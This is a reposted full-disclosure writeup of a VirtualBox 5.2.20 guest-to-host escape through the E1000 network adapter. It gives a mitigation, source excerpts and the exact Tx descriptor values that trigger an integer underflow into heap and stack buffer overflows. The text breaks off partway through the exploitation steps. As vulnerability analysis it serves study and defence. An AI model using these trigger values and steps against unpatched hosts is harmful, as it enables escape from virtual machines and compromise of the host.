<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Full disclosure: VirtualBox 0day Escape Vulnerability</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="I like VirtualBox, and it has nothing to do with the reason I post information about the vulnerability. The reason is disagreement with the current re...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Full disclosure: VirtualBox 0day Escape Vulnerability</h1><div class="post__text post__text-html js-mediator-article"><p><img src="https://habrastorage.org/webt/gu/rd/8r/gurd8rs3gzhcizcei9p383wktes.png" alt="image"></p><br><p>  I like VirtualBox, and it has nothing to do with the reason I post information about the vulnerability.  The reason is disagreement with the current realities in information security, more precisely, in the direction of security research and bug bounty. </p><a name="habracut"></a><br><ol><li>  It is considered normal to wait for a patch for vulnerabilities for six months, if only these bugs are no longer in public access. </li><li>  In the area of ‚Äã‚Äãbug bounty programs is considered normal: <br><ol><li>  Wait more than a month until the vulnerability is verified and the decision to acquire it is announced. </li><li>  On the go, change the decision on whether the program will buy bugs for this software.  Today you have learned that yes, they will buy, and in a week you come with bugs and exploits and get the answer that no, they will not. </li><li>  Do not have a clear list of applications for which the bugs will pay.  Yes, it is convenient for bug bounty organizers, no, it is inconvenient for researchers. </li><li>  Not have clearly defined upper and lower price limits for vulnerabilities.  There are a lot of factors affecting the price, but researchers need to see what it is worth wasting their time and what is not worth the day of work. </li></ol></li><li>  Mania of greatness and marketing nonsense: give names to vulnerabilities and create websites for them;  hold a thousand conferences a year;  to exaggerate the importance of their work;  consider yourself the "savior of the world."  Go down to earth, Your Highness. </li></ol><br><p>  The first two points completely exhausted me, so my move is full disclosure. </p><br><h2 id="obschaya-informaciya">  general information </h2><br><p>  <strong>Vulnerable software:</strong> VirtualBox 5.2.20 and earlier. <br>  <strong>Host OS:</strong> any, the bug is in a common code base. <br>  <strong>Guest OS:</strong> any. <br>  <strong>VM configuration:</strong> default (for operation, you only need the Intel PRO / 1000 MT Desktop network card (82540EM), and NAT to be the mode of operation). </p><br><h2 id="kak-zaschititsya">  How to protect </h2><br><p>  Until the patched version of VirtualBox is released, change the settings of your virtual machines to the network card on PCnet (either of the two) or on the Paravirtualized Network.  If there is no way to do this, then change the mode of operation with NAT to any other for the Intel adapter.  The first option is more reliable. </p><br><h2 id="vvedenie">  Introduction </h2><br><p>  When creating a new virtual machine, the default network adapter is the Intel PRO / 1000 MT Desktop (82540EM), configured to work in NAT mode.  For brevity, we will call it E1000. </p><br><p>  The virtual device code E1000 contains a vulnerability that allows an attacker with root / administrator rights in the guest OS to escape to the host OS and execute code in ring 3. Then the attacker can use the already well-known techniques for raising privileges to ring 0 using the VirtualBox / dev / vboxdrv driver . </p><br><h2 id="analiz-uyazvimosti">  Vulnerability analysis </h2><br><h3 id="obschie-svedeniya-o-e1000">  General information about the E1000 </h3><br><p>  To send network packets, the guest does the same thing as a regular computer: configures the network adapter and gives it packets, which consist of data link frames and other higher level headers.  Packets are not transmitted to the adapter by themselves, but wrapped in Tx-handles (Transmit Descriptor).  These data structures, described in the network card specification (317453006EN.PDF, Revision 4.0), store various meta-information, such as packet size or VLAN tag, manage TCP / IP segmentation, etc. </p><br><p>  The 82540EM specification provides three types of Tx descriptors: legacy, context, data.  Legacy descriptors were relevant, apparently, in the past.  The remaining two are used in conjunction.  For us, it is only important that context-descriptors set the maximum packet size and enable / disable TCP / IP-segmentation, and the data-descriptors put the addresses of the packages in physical memory and specify their size.  The packet size in the data descriptor cannot be larger than specified in the context descriptor.  Context descriptors are transferred to the network card, as a rule, before the data descriptors. </p><br><p>  To transfer Tx-descriptors to the network adapter, they are recorded in the Tx-ring (Transmit Descriptor Ring).  This is a ring buffer located in physical memory at a predefined address.  When all the required descriptors are written into the ring, the guest updates the TDT (Transmit Descriptor Tail) register in the MMIO adapter, which signals the host of new descriptors that need to be processed. </p><br><h3 id="ishodnye-dannye">  Initial data </h3><br><p>  We have the following array of Tx-descriptors: </p><br><pre><code class="hljs json">[context_1, data_2, data_3, context_4, data_5]</code> </pre> <br><p>  Suppose that they contain the following information (the names of the fields are specifically made human-readable, but they correspond to the descriptor fields from the 82540EM specification): </p><br><pre> <code class="hljs objectivec">context_1.header_length = <span class="hljs-number"><span class="hljs-number">0</span></span> context_1.maximum_segment_size = <span class="hljs-number"><span class="hljs-number">0x3010</span></span> context_1.tcp_segmentation_enabled = <span class="hljs-literal"><span class="hljs-literal">true</span></span> data_2.data_length = <span class="hljs-number"><span class="hljs-number">0x10</span></span> data_2.end_of_packet = <span class="hljs-literal"><span class="hljs-literal">false</span></span> data_2.tcp_segmentation_enabled = <span class="hljs-literal"><span class="hljs-literal">true</span></span> data_3.data_length = <span class="hljs-number"><span class="hljs-number">0</span></span> data_3.end_of_packet = <span class="hljs-literal"><span class="hljs-literal">true</span></span> data_3.tcp_segmentation_enabled = <span class="hljs-literal"><span class="hljs-literal">true</span></span> context_4.header_length = <span class="hljs-number"><span class="hljs-number">0</span></span> context_4.maximum_segment_size = <span class="hljs-number"><span class="hljs-number">0xF</span></span> context_4.tcp_segmentation_enabled = <span class="hljs-literal"><span class="hljs-literal">true</span></span> data_5.data_length = <span class="hljs-number"><span class="hljs-number">0x4188</span></span> data_5.end_of_packet = <span class="hljs-literal"><span class="hljs-literal">true</span></span> data_5.tcp_segmentation_enabled = <span class="hljs-literal"><span class="hljs-literal">true</span></span></code> </pre> <br><p>  Soon we will figure out why the descriptors should be just such for the operation of the error. </p><br><h3 id="sut-uyazvimosti">  The essence of the vulnerability </h3><br><h4 id="obrabotka-context_1-data_2-data_3">  Processing [context_1, data_2, data_3] </h4><br><p>  Imagine that the guest wrote down the above descriptors in the Tx-ring in exact order and updated the TDT register.  Now the VirtualBox process on the host will execute the e1kXmitPending function, which is located in the src / VBox / Devices / Network / DevE1000.cpp file (most of the comments here and further removed for readability): </p><br><pre> <code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e1kXmitPending</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">PE1KSTATE pThis, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">bool</span></span></span></span><span class="hljs-function"><span class="hljs-params"> fOnWorkerThread</span></span></span><span class="hljs-function">)</span></span> { ... <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (!pThis-&gt;fLocked &amp;&amp; e1kTxDLazyLoad(pThis)) { <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (e1kLocateTxPacket(pThis)) { fIncomplete = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; rc = e1kXmitAllocBuf(pThis, pThis-&gt;fGSO); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (RT_FAILURE(rc)) <span class="hljs-keyword"><span class="hljs-keyword">goto</span></span> <span class="hljs-keyword"><span class="hljs-keyword">out</span></span>; rc = e1kXmitPacket(pThis, fOnWorkerThread); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (RT_FAILURE(rc)) <span class="hljs-keyword"><span class="hljs-keyword">goto</span></span> <span class="hljs-keyword"><span class="hljs-keyword">out</span></span>; }</code> </pre> <br><p>  The e1kTxDLazyLoad function counts all 5 Tx descriptors from a Tx-ring.  Then e1kLocateTxPacket will be called for the first time.  This function bypasses all the descriptors and prepares the state for further work, but does not perform most of the work on the processing of the descriptors.  In our case, the first call to e1kLocateTxPacket will handle the context_1, data_2, data_3 descriptors.  The two remaining descriptors, context_4 and data_5, will be processed at the next iteration of the while loop (we will look at the second iteration in the next section).  This split of the array of descriptors in two leads to important consequences, so let's see why it happens. </p><br><p>  The e1kLocateTxPacket function looks like this: </p><br><pre> <code class="hljs php"><span class="hljs-keyword"><span class="hljs-keyword">static</span></span> bool e1kLocateTxPacket(PE1KSTATE pThis) { ... <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (int i = pThis-&gt;iTxDCurrent; i &lt; pThis-&gt;nTxDFetched; ++i) { E1KTXDESC *pDesc = &amp;pThis-&gt;aTxDescriptors[i]; <span class="hljs-keyword"><span class="hljs-keyword">switch</span></span> (e1kGetDescType(pDesc)) { <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> E1K_DTYP_CONTEXT: e1kUpdateTxContext(pThis, pDesc); <span class="hljs-keyword"><span class="hljs-keyword">continue</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> E1K_DTYP_LEGACY: ... <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> E1K_DTYP_DATA: <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!pDesc-&gt;data.u64BufAddr || !pDesc-&gt;data.cmd.u20DTALEN) <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; ... <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">default</span></span>: AssertMsgFailed((<span class="hljs-string"><span class="hljs-string">"Impossible descriptor type!"</span></span>)); }</code> </pre> <br><p>  The first descriptor (context_1) is E1K_DTYP_CONTEXT, therefore the function e1kUpdateTxContext is called.  This function updates the TCP segmentation context if segmentation was requested in the descriptor.  This is true for our context_1 descriptor (see previous section), so the TCP segmentation context will be updated (we are not interested in the essence of the "TCP segmentation context update", so we will use this term just to refer to this section of code). </p><br><p>  The second descriptor (data_2) is E1K_DTYP_DATA, for it some other actions are performed that have no meaning for us. </p><br><p>  The third descriptor (data_3) is E1K_DTYP_DATA, but since data_3.data_length == 0 (pDesc-&gt; data.cmd.u20DTALEN in the code above), no action is taken. <br>  At this point in time, all three descriptors are initially processed, and we have two more unprocessed descriptors.  Now the focus: in the above code, after the switch statement, it is checked whether the end_of_packet flag is set in the descriptor.  This is true for the data_3 descriptor (data_3.end_of_packet == true), so the code performs some actions and exits the function: </p><br><pre> <code class="hljs kotlin"> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (pDesc-&gt;legacy.cmd.fEOP) { ... <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-literal"><span class="hljs-literal">true</span></span>; }</code> </pre> <br><p>  If the data_3.end_of_packet flag were not set, then the remaining two descriptors would also be initially processed, and this would prevent the vulnerability.  Below, you will see why this exit from the function even before traversing all the descriptors leads to a bug. </p><br><p>  So, when returning from e1kLocateTxPacket, we have the following descriptors, ready to extract network packets from them and send to the network: context_1, data_2, data_3.  Now in the internal while loop of the e1kXmitPending function, e1kXmitPacket is called.  This function again bypasses all the descriptors (5 in our case) in order to finally process them: </p><br><pre> <code class="hljs rust"><span class="hljs-keyword"><span class="hljs-keyword">static</span></span> int e1kXmitPacket(PE1KSTATE pThis, <span class="hljs-built_in"><span class="hljs-built_in">bool</span></span> fOnWorkerThread) { ... <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (pThis-&gt;iTxDCurrent &lt; pThis-&gt;nTxDFetched) { E1KTXDESC *pDesc = &amp;pThis-&gt;aTxDescriptors[pThis-&gt;iTxDCurrent]; ... rc = e1kXmitDesc(pThis, pDesc, e1kDescAddr(TDBAH, TDBAL, TDH), fOnWorkerThread); ... <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (e1kGetDescType(pDesc) != E1K_DTYP_CONTEXT &amp;&amp; pDesc-&gt;legacy.cmd.fEOP) <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; }</code> </pre> <br><p>  For each descriptor, the e1kXmitDesc function is called: </p><br><pre> <code class="hljs php"><span class="hljs-keyword"><span class="hljs-keyword">static</span></span> int e1kXmitDesc(PE1KSTATE pThis, E1KTXDESC *pDesc, RTGCPHYS addr, bool fOnWorkerThread) { ... <span class="hljs-keyword"><span class="hljs-keyword">switch</span></span> (e1kGetDescType(pDesc)) { <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> E1K_DTYP_CONTEXT: ... <span class="hljs-keyword"><span class="hljs-keyword">break</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> E1K_DTYP_DATA: { ... <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (pDesc-&gt;data.cmd.u20DTALEN == <span class="hljs-number"><span class="hljs-number">0</span></span> || pDesc-&gt;data.u64BufAddr == <span class="hljs-number"><span class="hljs-number">0</span></span>) { E1kLog2((<span class="hljs-string"><span class="hljs-string">"% Empty data descriptor, skipped.\n"</span></span>, pThis-&gt;szPrf)); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (e1kXmitIsGsoBuf(pThis-&gt;CTX_SUFF(pTxSg))) { ... } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!pDesc-&gt;data.cmd.fTSE) { ... } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { STAM_COUNTER_INC(&amp;pThis-&gt;StatTxPathFallback); rc = e1kFallbackAddToFrame(pThis, pDesc, fOnWorkerThread); } } ...</code> </pre> <br><p>  The first descriptor that is passed to e1kXmitDesc is context_1.  The function does nothing for context descriptors. </p><br><p>  The second handle is data_2.  Since we set the tcp_segmentation_enable == true flag for all data descriptors (pDesc-&gt; data.cmd.fTSE in the code above), we call the e1kFallbackAddToFrame function, where an overflow of the integer variable will later occur when processing the data_5 descriptor. </p><br><pre> <code class="hljs rust"><span class="hljs-keyword"><span class="hljs-keyword">static</span></span> int e1kFallbackAddToFrame(PE1KSTATE pThis, E1KTXDESC *pDesc, <span class="hljs-built_in"><span class="hljs-built_in">bool</span></span> fOnWorkerThread) { ... uint16_t u16MaxPktLen = pThis-&gt;contextTSE.dw3.u8HDRLEN + pThis-&gt;contextTSE.dw3.u16MSS; <span class="hljs-comment"><span class="hljs-comment">/* * Carve out segments. */</span></span> int rc = VINF_SUCCESS; <span class="hljs-keyword"><span class="hljs-keyword">do</span></span> { <span class="hljs-comment"><span class="hljs-comment">/* Calculate how many bytes we have left in this TCP segment */</span></span> uint32_t cb = u16MaxPktLen - pThis-&gt;u16TxPktLen; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (cb &gt; pDesc-&gt;data.cmd.u20DTALEN) { <span class="hljs-comment"><span class="hljs-comment">/* This descriptor fits completely into current segment */</span></span> cb = pDesc-&gt;data.cmd.u20DTALEN; rc = e1kFallbackAddSegment(pThis, pDesc-&gt;data.u64BufAddr, cb, pDesc-&gt;data.cmd.fEOP <span class="hljs-comment"><span class="hljs-comment">/*fSend*/</span></span>, fOnWorkerThread); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { ... } pDesc-&gt;data.u64BufAddr += cb; pDesc-&gt;data.cmd.u20DTALEN -= cb; } <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (pDesc-&gt;data.cmd.u20DTALEN &gt; <span class="hljs-number"><span class="hljs-number">0</span></span> &amp;&amp; RT_SUCCESS(rc)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (pDesc-&gt;data.cmd.fEOP) { ... pThis-&gt;u16TxPktLen = <span class="hljs-number"><span class="hljs-number">0</span></span>; ... } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> VINF_SUCCESS; }</code> </pre> <br><p>  The most important variables for us are here: u16MaxPktLen, pThis-&gt; u16TxPktLen, pDesc-&gt; data.cmd.u20DTALEN. </p><br><p>  Let's draw a table where the values ‚Äã‚Äãof variables will be indicated before and after the e1kFallbackAddToFrame function is executed for two data descriptors. </p><br><table><thead><tr><th>  Tx handle </th><th>  Before after </th><th>  u16MaxPktLen </th><th>  pThis-&gt; u16TxPktLen </th><th>  pDesc-&gt; data.cmd.u20DTALEN </th></tr></thead><tbody><tr><td>  data_2 </td><td>  Before </td><td>  0x3010 </td><td>  0 </td><td>  0x10 </td></tr><tr><td>  - </td><td>  After </td><td>  0x3010 </td><td>  0x10 </td><td>  0 </td></tr><tr><td>  data_3 </td><td>  Before </td><td>  0x3010 </td><td>  0x10 </td><td>  0 </td></tr><tr><td>  - </td><td>  After </td><td>  0x3010 </td><td>  0x10 </td><td>  0 </td></tr></tbody></table><br><p>  For us, the only important thing is that when data_3 is processed, pThis-&gt; u16TxPktLen is 0x10. <br>  And now the most important point.  Take another look at the end of the listing for the e1kXmitPacket function: </p><br><pre> <code class="hljs lisp"> if (<span class="hljs-name"><span class="hljs-name">e1kGetDescType</span></span>(<span class="hljs-name"><span class="hljs-name">pDesc</span></span>) != E1K_DTYP_CONTEXT <span class="hljs-symbol"><span class="hljs-symbol">&amp;&amp;</span></span> pDesc-&gt;legacy.cmd.fEOP) break<span class="hljs-comment"><span class="hljs-comment">;</span></span></code> </pre> <br><p>  Since the data_3 descriptor type is not equal to E1K_DTYP_CONTEXT, and since data_3.end_of_packet == true, we break the loop despite the fact that we also need to handle context_4 and data_5.  Again, we have not finished working with descriptors, as is the case with the initial processing.  Why is it important?  To understand the essence of the vulnerability, you need to understand that all context-descriptors are processed before data-descriptors.  Context descriptors are processed during the update of the TCP segmentation context in the e1kLocateTxPacket function.  Data descriptors are processed later in the e1kXmitPacket function.  The developers have done so in order to prohibit changing the variable u16MaxPktLen, which is controlled by context-descriptors, after several bytes of network packets have been processed.  If we could change context descriptors at any time, we could easily achieve an integer overflow in e1kFallbackAddToFrame (the size of the processed data lies in pThis-&gt; u16TxPktLen): </p><br><pre> <code class="hljs erlang-repl">uint32_t cb = u16MaxPktLen - pThis-&gt;u16TxPktLen;</code> </pre> <br><p>  But we can bypass this overflow protection.  Recall that back in e1kLocateTxPacket, we forced the function to perform a return due to the fact that data_3.end_of_packet == true.  Because of this, we still have two descriptors (context_4 and data_5) awaiting initial and final processing, despite the fact that we have already processed several bytes (pThis-&gt; u16TxPktLen is 0x10, not zero). </p><br><p>  So, we have the opportunity to change u16MaxPktLen arbitrarily using context_4.maximum_segment_size in order to achieve an integer overflow. </p><br><h4 id="obrabotka-context_4-data_5">  Processing [context_4, data_5] </h4><br><p>  We have completely processed the first three descriptors and return to the beginning of the internal while loop of the e1kXmitPending function: </p><br><pre> <code class="hljs objectivec"> <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (e1kLocateTxPacket(pThis)) { fIncomplete = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; rc = e1kXmitAllocBuf(pThis, pThis-&gt;fGSO); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (RT_FAILURE(rc)) <span class="hljs-keyword"><span class="hljs-keyword">goto</span></span> <span class="hljs-keyword"><span class="hljs-keyword">out</span></span>; rc = e1kXmitPacket(pThis, fOnWorkerThread); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (RT_FAILURE(rc)) <span class="hljs-keyword"><span class="hljs-keyword">goto</span></span> <span class="hljs-keyword"><span class="hljs-keyword">out</span></span>; }</code> </pre> <br><p>  Here we call e1kLocateTxPacket to perform the initial processing of context_4 and data_5.  As mentioned earlier, we can set the value of context_4.maximum_segment_size in an arbitrary way, incl.  such that it will be less than the size of the data that we have already processed.  Remember our initial data: </p><br><pre> <code class="hljs objectivec">context_4.header_length = <span class="hljs-number"><span class="hljs-number">0</span></span> context_4.maximum_segment_size = <span class="hljs-number"><span class="hljs-number">0xF</span></span> context_4.tcp_segmentation_enabled = <span class="hljs-literal"><span class="hljs-literal">true</span></span> data_5.data_length = <span class="hljs-number"><span class="hljs-number">0x4188</span></span> data_5.end_of_packet = <span class="hljs-literal"><span class="hljs-literal">true</span></span> data_5.tcp_segmentation_enabled = <span class="hljs-literal"><span class="hljs-literal">true</span></span></code> </pre> <br><p>  After running e1kLocateTxPacket, we have a maximum network packet size of 0xF, while the size of the already processed data is 0x10. </p><br><p>  Finally, during the processing of data_5, the function e1kFallbackAddToFrame is called, where we have the following variable values: </p><br><table><thead><tr><th>  Tx handle </th><th>  Before after </th><th>  u16MaxPktLen </th><th>  pThis-&gt; u16TxPktLen </th><th>  pDesc-&gt; data.cmd.u20DTALEN </th></tr></thead><tbody><tr><td>  data_5 </td><td>  Before </td><td>  0xF </td><td>  0x10 </td><td>  0x4188 </td></tr><tr><td>  - </td><td>  After </td><td>  - </td><td>  - </td><td>  - </td></tr></tbody></table><br><p>  As a result, an integer overflow occurs: </p><br><pre> <code class="hljs php">uint32_t cb = u16MaxPktLen - pThis-&gt;u16TxPktLen; =&gt; uint32_t cb = <span class="hljs-number"><span class="hljs-number">0xF</span></span> - <span class="hljs-number"><span class="hljs-number">0x10</span></span> = <span class="hljs-number"><span class="hljs-number">0xFFFFFFFF</span></span>;</code> </pre> <br><p>  This allows us to successfully perform the following check, because  0xFFFFFFFF&gt; 0x4188: </p><br><pre> <code class="hljs kotlin"> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (cb &gt; pDesc-&gt;<span class="hljs-keyword"><span class="hljs-keyword">data</span></span>.cmd.u20DTALEN) { cb = pDesc-&gt;<span class="hljs-keyword"><span class="hljs-keyword">data</span></span>.cmd.u20DTALEN; rc = e1kFallbackAddSegment(pThis, pDesc-&gt;<span class="hljs-keyword"><span class="hljs-keyword">data</span></span>.u64BufAddr, cb, pDesc-&gt;<span class="hljs-keyword"><span class="hljs-keyword">data</span></span>.cmd.fEOP <span class="hljs-comment"><span class="hljs-comment">/*fSend*/</span></span>, fOnWorkerThread); }</code> </pre> <br><p>  Now the e1kFallbackAddSegment function will be called with a size (cb) of 0x4188.  Without a vulnerability, it is impossible to call this function with a size greater than 0x4000, since  In the process of updating the TCP segmentation context, it checks that the maximum segment size is less than or equal to 0x4000: </p><br><pre> <code class="hljs lisp">DECLINLINE(<span class="hljs-name"><span class="hljs-name">void</span></span>) e1kUpdateTxContext(<span class="hljs-name"><span class="hljs-name">PE1KSTATE</span></span> pThis, E1KTXDESC *pDesc) { ... uint32_t cbMaxSegmentSize = pThis-&gt;contextTSE.dw3.u16MSS + pThis-&gt;contextTSE.dw3.u8HDRLEN + 4; /*VTAG*/ if (<span class="hljs-name"><span class="hljs-name">RT_UNLIKELY</span></span>(<span class="hljs-name"><span class="hljs-name">cbMaxSegmentSize</span></span> &gt; E1K_MAX_TX_PKT_SIZE)) { pThis-&gt;contextTSE.dw3.u16MSS = E1K_MAX_TX_PKT_SIZE - pThis-&gt;contextTSE.dw3.u8HDRLEN - <span class="hljs-number"><span class="hljs-number">4</span></span><span class="hljs-comment"><span class="hljs-comment">; /*VTAG*/ ... }</span></span></code> </pre> <br><h4 id="perepolnenie-bufera">  Buffer overflow </h4><br><p>  How can we exploit our ability to call the e1kFallbackAddSegment function with an arbitrary size?  I found at least two possibilities.  First, the data that the guest sends is copied to the buffer on the heap: </p><br><pre> <code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e1kFallbackAddSegment</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(PE1KSTATE pThis, RTGCPHYS PhysAddr, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">uint16_t</span></span></span></span><span class="hljs-function"><span class="hljs-params"> u16Len, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">bool</span></span></span></span><span class="hljs-function"><span class="hljs-params"> fSend, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">bool</span></span></span></span><span class="hljs-function"><span class="hljs-params"> fOnWorkerThread)</span></span></span><span class="hljs-function"> </span></span>{ ... PDMDevHlpPhysRead(pThis-&gt;CTX_SUFF(pDevIns), PhysAddr, pThis-&gt;aTxPacketFallback + pThis-&gt;u16TxPktLen, u16Len);</code> </pre> <br><p>  Here, pThis-&gt; aTxPacketFallback is a buffer of size 0x3FA0, and u16Len is 0x4188 - an obvious heap overflow, which can lead, say, to rewriting pointers to functions, objects, or anything else. </p><br><p>  Secondly, if we look deeper, we find that e1kFallbackAddSegment calls the e1kTransmitFrame function, which, with a certain configuration of the network adapter registers, calls e1kHandleRxPacket.  This function allocates a buffer of size 0x4000 on the stack and copies into it data with the specified size without any checks, since  they were performed earlier: </p><br><pre> <code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">e1kHandleRxPacket</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(PE1KSTATE pThis, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="hljs-function"><span class="hljs-params"> *pvBuf, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">size_t</span></span></span></span><span class="hljs-function"><span class="hljs-params"> cb, E1KRXDST status)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta"> defined(IN_RING3) uint8_t rxPacket[E1K_MAX_RX_PKT_SIZE]; ... </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">if</span></span></span><span class="hljs-meta"> (status.fVP) { ... } </span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">else</span></span></span><span class="hljs-meta"> memcpy(rxPacket, pvBuf, cb);</span></span></code> </pre> <br><p>  As you can see, we have converted the integer overflow vulnerability to the classic stack buffer overflow vulnerability.  Both of the examples above, heap buffer overflow and stack buffer overflow, are involved in the exploit. </p><br><h2 id="eksploit">  Exploit </h2><br><p>  The exploit is the Linux kernel module, which is loaded into the guest OS.  For Windows, you need a driver that will be different except as a wrapper for initialization and other nuclear API calls. </p><br><p>  Driver loading on both operating systems requires elevated privileges.  This is a normal phenomenon and is not considered an insurmountable obstacle.  For example, take a look at the Pwn2Own competition, where researchers use exploit chains: the guest OS uses the browser that opened the ‚Äúmalicious‚Äù site, escapes from the browser sandbox for full access to the context ring 3, exploits a vulnerability in the operating system to access ring 0 , from where all opportunities for attack on a hypervisor from guest OS open. </p><br><p>  Of course, the most powerful vulnerabilities in hypervisors are those that are exploited from ring 3 of a guest.  In VirtualBox, too, there is code that is reachable without root privileges, and it is still poorly understood. </p><br><p>  The exploit is 100% stable.  This means that it either works always, or does not work at all because of inappropriate binaries or something more problematic, which I have not provided for.  On guest Ubuntu 16.04 and 18.04 x86_64 with the default configuration, it works. </p><br><h3 id="algoritm-ekspluatacii">  Operation algorithm </h3><br><ol><li>  The attacker unloads the e1000.ko ‚Äã‚Äãkernel module, which runs by default on Linux guest systems, and loads its driver. </li><li>  The driver initializes the E1000 network adapter according to the specification.  Only the transmit-part is initialized, since  The receive part is not used. </li><li>  Step 1: information leak. <br><ol><li>  The loopback mode of the network adapter is disabled, so that the code containing the stack buffer overflow will be unreachable. </li><li>  With the help of the main vulnerability is done integer underflow, leading to the heap buffer overflow, but not the stack buffer overflow. </li><li>  Heap buffer overflow leads to the fact that when interacting with the network adapter EEPROM, you can write any two bytes relative to the buffer on the heap within 128 kilobytes.  Thus, the attacker receives a write primitive. </li><li>  Using a write primitive, eight bytes are written to the data structure on the heap relating to the Advanced Configuration and Power Interface (ACPI) device.  A byte is written to a variable that is used when accessing ACPI as an index in an array on the heap from which one byte will be read.  Since the size of the array is smaller than the number that is 